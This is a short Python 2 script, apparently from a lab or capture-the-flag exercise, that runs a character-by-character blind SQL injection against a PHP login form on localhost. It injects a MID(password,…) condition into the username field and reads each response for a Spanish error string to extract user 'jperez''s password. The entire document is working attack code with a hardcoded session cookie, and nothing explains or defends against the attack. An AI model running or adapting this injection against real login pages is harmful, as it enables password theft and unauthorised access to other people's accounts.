# -*- coding: utf-8 -*-
# Autor:@nogagmx 
import requests
import urllib

URL = "http://localhost:8001/login.php"
cookies = {"PHPSESSID": "algi1mn3bfotsj87bmma697ng1"}
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Referer": "http://192.168.1.69/", "Upgrade-Insecure-Requests": "1"}
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$^&*()-=+{}'
username = "jperez"
pwd = ""
for i in range(1,42):
	for strg in charset:
		payload_1 = "' && MID(password," + str(i) + ", 1)='"+ strg + "' -- "
		data = {"username": username + payload_1 , "password": "fdf"}
		res = requests.post(URL, headers=headers, cookies=cookies, data=data)
		#print payload_1
		#print res.content
		if "Usuario o Contraseña Incorrectos" not in res.content:
			pwd += strg
			print pwd
			break;
print "[+] Password Found:" + pwd
